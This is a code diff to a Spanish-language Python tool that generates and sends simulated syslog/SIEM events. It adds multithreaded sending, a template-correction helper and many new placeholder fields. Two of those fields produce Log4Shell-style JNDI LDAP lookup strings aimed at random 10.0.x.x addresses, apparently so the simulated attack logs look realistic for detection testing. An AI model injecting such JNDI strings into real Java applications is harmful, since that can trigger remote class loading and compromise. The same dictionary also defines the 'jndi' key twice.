@@ -20,7 +20,9 @@ import data_generators
 import syslog_sender
 import utils
 import app_logger
-
+#---  multi hilo-----
+import concurrent.futures # <---ThreadPoolExecutor
+import threading        # <--- Lock
 # --- Interfaz de Usuario ---
 
 def mostrar_nuevo_menu_seleccion():
@@ -1343,6 +1345,7 @@ def generar_datos_para_log():
         'udp_len': str(random.randint(1, 65535)),
         'command_line_sysmon': f"cmd-{random.randint(1, 100)}",
         'protocol_linux': random.choice(['TCP', 'UDP', 'ICMP']),
+        "jndi": f"{{jndi:ldap://10.0.{random.randint(0, 255)}.{random.randint(1, 254)}:1389/a}}",
         
         # ...Rapid SCADA...
         'scada_timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
@@ -1449,10 +1452,10 @@ def generar_datos_para_log():
         'terminal_session_id': f"session-{random.randint(1000, 9999)}",  # ID de sesión de terminal
         'integrity_level': random.choice(['Low', 'Medium', 'High']),   # Nivel de integridad
         'acl_blocked_ssh': 'Blocked SSH connection',    # Mensaje de bloqueo de SSH
-        'md5_sysmon ': f"{random.randint(1, 1000):032x}",  # Hash MD5 para Sysmon
-        'sha1_sysmon ': f"{random.randint(1, 1000):064x}",  # Hash SHA1 para Sysmon
-        'sha256_sysmon ': f"{random.randint(1, 1000):064x}",  # Hash SHA256 para Sysmon
-        'sha512_sysmon ': f"{random.randint(1, 1000):128x}",  # Hash SHA512 para Sysmon 
+        'md5_sysmon': f"{random.randint(1, 1000):032x}",  # Hash MD5 para Sysmon
+        'sha1_sysmon': f"{random.randint(1, 1000):064x}",  # Hash SHA1 para Sysmon
+        'sha256_sysmon': f"{random.randint(1, 1000):064x}",  # Hash SHA256 para Sysmon
+        'sha512_sysmon': f"{random.randint(1, 1000):128x}",  # Hash SHA512 para Sysmon 
 
         'honeypot_file': f"honeypot-{random.randint(1, 100)}.txt",
         'process_name': f"process-{random.randint(1, 100)}",
@@ -1530,6 +1533,7 @@ def generar_datos_para_log():
         'origin_header': 'https://example.com',
         'parameter_payload': '{"param": "value"}',
         'password_placeholder': '********',
+        'token_expected': f"token-{random.randint(1, 100)}",
         'payload': '{"key": "value"}',
         'payload_contains': 'sensitive_data',
         'php-fpm[{pid_web}]': f"php-fpm[{random.randint(1000, 9999)}]",
@@ -1571,13 +1575,93 @@ def generar_datos_para_log():
         'voucher_code': 'DISCOUNT2025',
         'waf[{pid_waf}]': f"waf[{random.randint(1000, 9999)}]",
         'web_server_hostname': f"web-server-{random.randint(1, 100)}.example.com",
-        'zip_entry_name': f"entry-{random.randint(1, 100)}.zip",       
+        'zip_entry_name': f"entry-{random.randint(1, 100)}.zip",
+        'query_string_web': f"query={random.randint(1, 100)}",
+        'user_input_variable': f"input-{random.randint(1, 100)}",
+        'token_received': f"token-{random.randint(1, 100)}",
+        '\\"username\\"': f"user-{random.randint(1, 100)}",
+        'imphash': f"{random.randint(1, 1000):032x}",
+        'imphash_sysmon': f"{random.randint(1, 1000):032x}",
+        "(#_='multipart/form-data')": "multipart/form-data",
+        "jndi": f"jndi:ldap://10.0.{random.randint(0, 255)}.{random.randint(1, 254)}:1389/a",
+        '\\"user_id\\"': f"user-{random.randint(1, 100)}",  # Placeholder con comillas escapadas
+        "parent_command_line": f"cmd-{random.randint(1, 100)}", 
+        'hostname_ipa': f"ipa-host-{random.randint(1, 100)}",
+        'pid_ipa': str(random.randint(1000, 9999)),
+        'aes256,aes128,...': "aes256,aes128,...",  # Escapado como texto literal
+        'aes256,aes128,': f"{random.randint(1, 1000):032x}",  # Valor hexadecimal aleatorio
+        '"aes256,aes128,"': f"{random.randint(1, 1000):032x}",  # Valor hexadecimal aleatorio
+        'aes256,aes128': f"{random.randint(1, 1000):032x}",  # Valor hexadecimal aleatorio
+        'client_ip_a': f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}",
+        'aes128-cts': f"{random.randint(1, 1000):032x}",  # Valor hexadecimal aleatorio
+        'aes256-cts': f"{random.randint(1, 1000):032x}",  # Valor hexadecimal aleatorio       
+        'service_principal': f"service-{random.randint(1, 100)}",
     }
 
     # Asegurarse de que todos los valores sean strings para .format
     return {k: str(v) for k, v in data.items()}
 
+# multi hilo
 
+# --- (Función Worker para Multihilo) ---
+
+def enviar_log_worker(template, sender, target_info_str, lock, contadores):
+    """
+    Función ejecutada por cada hilo para procesar y enviar un log.
+
+    Args:
+        template (str): La plantilla de log a usar.
+        sender (syslog_sender.SyslogSender): La instancia para enviar el log.
+        target_info_str (str): String con IP:Puerto (Protocolo) para logging.
+        lock (threading.Lock): Lock para actualizar contadores de forma segura.
+        contadores (dict): Diccionario compartido para los contadores.
+
+    Returns:
+        str: "ok", "formato_error", "envio_error" indicando el resultado.
+    """
+    try:
+        # Generar datos dentro del worker para variabilidad por hilo
+        data = generar_datos_para_log()
+        log_message = template.format(**data)
+
+        # Enviar log
+        if sender.send(log_message):
+            with lock: # Asegurar acceso exclusivo a los contadores
+                contadores['ok'] += 1
+            return "ok"
+        else:
+            # El error ya se habrá logueado en sender.send si la implementación es robusta
+            # Opcionalmente, obtener y loguear aquí si es necesario
+            send_error = getattr(sender, 'last_error', 'Error desconocido de envío')
+            # loguear error (considerar si ya se hizo en sender.send)
+            # app_logger.log_send_error(target_info_str, send_error)
+            with lock:
+                contadores['envio_error'] += 1
+                # Control para imprimir solo el primer error
+                if contadores['envio_error'] == 1:
+                     print(f"\n[ERROR DE ENVÍO] Primer fallo al enviar log a {target_info_str}. Verifica conexión/servidor. Error: {send_error}")
+            return "envio_error"
+        
+
+    except KeyError as e:
+        missing_placeholder = str(e).strip("'")
+        error_msg = f"Falta marcador '{missing_placeholder}'"
+        # Intentar loguear aunque 'data' podría no estar definido si el error es muy temprano
+        app_logger.log_generation_error(template, list(locals().get('data', {}).keys()), error_msg)
+        app_logger.log_placeholder_not_found(missing_placeholder)
+        with lock:
+            contadores['formato_error'] += 1
+            if contadores['formato_error'] == 1:
+                 print(f"\n[ERROR DE FORMATO] {error_msg} en plantilla: '{template[:100]}...'. Verifica tus plantillas.")
+        return "formato_error"
+    except Exception as e:
+        error_msg = f"Error inesperado formateando/enviando en worker: {e}"
+        app_logger.log_generation_error(template, list(locals().get('data', {}).keys()), error_msg)
+        with lock:
+            contadores['formato_error'] += 1
+            if contadores['formato_error'] == 1:
+                 print(f"\n[ERROR INESPERADO EN WORKER] {error_msg} en plantilla: '{template[:100]}...'.")
+        return "formato_error"
 # --- Lógica Principal ---
 
 def main():
@@ -1595,10 +1679,10 @@ def main():
         app_logger.log_info("No se seleccionaron tecnologías o el usuario salió. Terminando.")
         print("\nNo se seleccionaron tecnologías. Saliendo...")
         return
-
+    
     # 2. Cargar plantillas
     plantillas_totales = []
-    app_logger.log_info(f"Intentando cargar plantillas para: {', '.join(tecnologias_seleccionadas)}")
+    #app_logger.log_info(f"Intentando cargar plantillas para: {', '.join(tecnologias_seleccionadas)}")
     for tech in tecnologias_seleccionadas:
         # Usar utils.cargar_plantillas y registrar problemas con app_logger
         plantillas_tech = utils.cargar_plantillas(tech)
@@ -1612,6 +1696,8 @@ def main():
         print("Asegúrate de que los archivos existen en el directorio 'logs', no están vacíos y tienen el formato correcto.")
         app_logger.log_error("No se cargaron plantillas válidas. Terminando simulación.")
         return
+    # Corregir las plantillas cargadas
+    plantillas_totales = [corregir_plantilla(p) for p in plantillas_totales]
 
     print(f"\nTotal de plantillas cargadas y listas para usar: {len(plantillas_totales)}")
     app_logger.log_info(f"Total de plantillas cargadas: {len(plantillas_totales)}")
@@ -1761,6 +1847,7 @@ def main():
         app_logger.log_simulation_end(
             logs_attempted=(logs_enviados_ok + logs_fallidos_envio + logs_fallidos_formato),
             logs_sent_ok=logs_enviados_ok
+            #log_info(f"Simulación terminada. Logs intentados: {logs_attempted}, Logs enviados: {logs_sent_ok}")
         )
         app_logger.log_info("Simulador de logs terminado.")
 
@@ -1788,6 +1875,19 @@ if __name__ == "__main__":
              app_logger.log_error(f"Error inesperado creando el directorio '{logs_dir}': {e}", exc_info=True)
              # Podríamos decidir salir o continuar dependiendo de la severidad
              # exit(1)
+    def corregir_plantilla(plantilla):
+        """
+        Corrige placeholders inválidos en una plantilla.
+
+        Args:
+            plantilla (str): La plantilla de log.
+
+        Returns:
+            str: La plantilla corregida.
+        """
+        # Reemplazar el placeholder inválido por un valor estático
+        plantilla = plantilla.replace("{aes256,aes128,...}", "aes256,aes128")
+        return plantilla
 
     # Llamar a la función principal que contiene toda la lógica
     main()
